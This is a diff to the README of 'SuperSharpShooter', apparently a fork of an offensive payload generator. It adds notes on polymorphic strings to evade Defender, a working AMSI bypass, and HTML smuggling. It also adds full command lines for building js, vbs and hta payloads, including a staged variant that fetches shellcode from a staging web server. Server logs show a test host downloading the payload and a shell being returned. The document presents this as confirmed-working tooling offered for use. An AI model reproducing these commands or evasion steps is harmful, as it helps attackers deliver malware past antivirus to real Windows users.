@@ -2,9 +2,10 @@ Forking... and fixing a couple of things.
 
 What's new:
 1. Fixed the amsiEnable bypass to use the filelocation-independent version
-2. Added polymorphism to the string "SharpShooter", which was popping Defender signature-based detections (seriously, that's all you got?).  This is enabled by default and cannot be disabled
+2. Added polymorphism to the string "SharpShooter", which was popping Defender signature-based detections.  This is enabled by default in this version.  If you want it disabled, by all means... comment out in SuperSharpShooter.py:507 : 
+    x.template_code = x.fix_hardcode(x.template_code, x.code_type)
 3. Fixed .NET v4 js, vbs, hta sharpshooterv4 and stagelessv4
-4. Ported to python3 (sorry but not sorry if python2 support lost?)
+4. Ported to python3
 
 I can confirm that stageless js, vbs, and hta all work.  Can also confirm amsi bypass and defender bypass works (at least at this time).  Can also confirm HTML smuggling stageless works.
 
@@ -31,6 +32,44 @@ I can confirm that stageless js, vbs, and hta all work.  Can also confirm amsi b
     ./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload js --output test --amsi amsienable --smuggle --template mcafee
 
 	./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload vbs --output test --amsi amsienable --smuggle --template mcafee
+
+Technique notes:
+Test host:  Windows 10, no internet
+Initial load of smuggling page:
+192.168.1.86 - - [19/Jan/2022:23:37:54 -0800] "GET /test2.html HTTP/1.1" 200 57832 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
+
+After clicking/running the smuggled payload directly from the browser (roughly 30 seconds later):
+192.168.1.86 - - [19/Jan/2022:23:21:12 -0800] "-" 408 0 "-" "-"
+
+After waiting between 3 mins and 10 mins based on testing:
+"SmartScreen can't be reached.  Run anyways?".  After clicking yes, the payload is downloaded, and a shell is returned
+
+... which is strange, because if you try to run the smuggled payload that's downloaded directly from the Downloads folder (outside of the browser), a shell is returned in a very reasonable amount of time.  Suspecting isolated SmartScreen filter as adding a massive latency.
+
+
+### Staged with AMSI Bypass, web delivery, HTML Smuggling of the stager
+    ./SuperSharpShooter.py --dotnetver 4 --shellcode --payload js --output test --amsi amsienable --smuggle --template mcafee --delivery web --web http://192.168.1.99/test.pay --scfile /var/www/html/met64.sharp
+
+Technique notes:
+Test host Windows 10, no internet
+
+The initial load of the .html:
+192.168.1.86 - - [19/Jan/2022:23:20:20 -0800] "GET /test.html HTTP/1.1" 200 61396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+^^ 200 status code '200 61396 "-"'
+
+After about 30 seconds after clicking the .js file:
+192.168.1.86 - - [19/Jan/2022:23:21:12 -0800] "-" 408 0 "-" "-"
+^^ 408 status code '408 0 "-"'
+
+After anywhere between 2 mins and 10 mins (based on testing)  total from .js click/run, "SmartScreen can't be reached.  Run anyways?".  After clicking yes, the payload is downloaded, and a shell is returned:
+192.168.1.86 - - [19/Jan/2022:23:22:58 -0800] "GET /test.pay HTTP/1.1" 200 3373 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
+^^ 200 status code '"GET /test.pay HTTP/1.1" 200 3373 "-"'
+
+### Other notes:
+For .hta payloads, mshta.exe is a 32-bit process, so keep in mind your shellcode should be 32bit too in that case.  Else, most likely prefer x64bit shellcode for all other scenarios in modern environments.
+
+Also, don't be afraid of the DotNet ver=4, that's fixed now by the way.
+
 
 
 Big ups MDSec!
